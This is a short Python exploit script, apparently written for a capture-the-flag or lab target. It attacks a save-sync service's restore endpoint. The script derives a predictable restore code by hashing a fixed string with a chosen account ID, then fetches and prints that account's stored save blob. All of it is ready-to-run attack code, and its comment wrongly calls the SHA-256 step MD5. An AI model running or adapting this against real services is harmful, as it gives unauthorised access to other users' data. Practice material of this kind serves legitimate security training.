#!/usr/bin/python3
import base64
import hashlib
import requests
import sys

ip = sys.argv[1]
BASE_URL = f"http://{ip}:27000"

account_id = 1337

# 1. Replicate the native string formatting and MD5 hashing
raw_string = f"s4v3sync::r3st0r3::v1::9a3f1c:{account_id}"
restore_code = hashlib.sha256(raw_string.encode("utf-8")).hexdigest()[:32]

print(f"[*] Target Account ID: {account_id}")
print(f"[*] Derived Restore Code: {restore_code}")

# 2. Request the save blob using the restore endpoint
response = requests.get(f"{BASE_URL}/sync/restore", params={"code": restore_code})

print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")

if response.status_code == 200:
  blob_b64 = response.json().get("blob")
  if blob_b64:
    raw_blob = base64.b64decode(blob_b64)
    print(f"\n[+] Successfully retrieved save blob! Length: {len(raw_blob)} bytes")
    print(raw_blob, flush=True)
